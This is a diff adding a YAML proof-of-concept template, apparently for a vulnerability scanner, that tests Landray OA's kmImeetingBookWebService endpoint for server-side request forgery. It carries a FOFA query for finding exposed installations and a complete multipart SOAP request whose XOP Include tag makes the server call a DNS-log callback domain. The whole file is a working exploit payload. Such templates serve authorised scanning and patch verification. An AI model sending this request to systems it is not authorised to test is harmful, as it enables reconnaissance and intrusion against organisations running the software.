@@ -1,0 +1,26 @@
+id: poc-yaml-landray-kmimeetingbookwebservice-ssrf
+info:
+  name: 蓝凌OA kmImeetingBookWebService SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: landray
+  fofa: app="Landray-OA系统"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /sys/webservice/kmImeetingBookWebService
+  headers:
+    Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+  data: "------4upt9dwdca8rtwq9osuz\nContent-Disposition: form-data; name=\"a\"\n\n\
+    <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:web=\"http://webservice.imeeting.km.kmss.landray.com/\">\n<soapenv:Header/>\n\
+    <soapenv:Body>\n    <web:getImeetingBookLists>\n        <arg0>\n            <beginTimeStamp>a</beginTimeStamp>\n\
+    \            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\"\
+    \ href=\"http://{{.domain}}\"/></count>\n        </arg0>\n    </web:getImeetingBookLists>\n\
+    </soapenv:Body>\n</soapenv:Envelope>\n------4upt9dwdca8rtwq9osuz--"
+  expression: reverse.Verify()
+transport: http
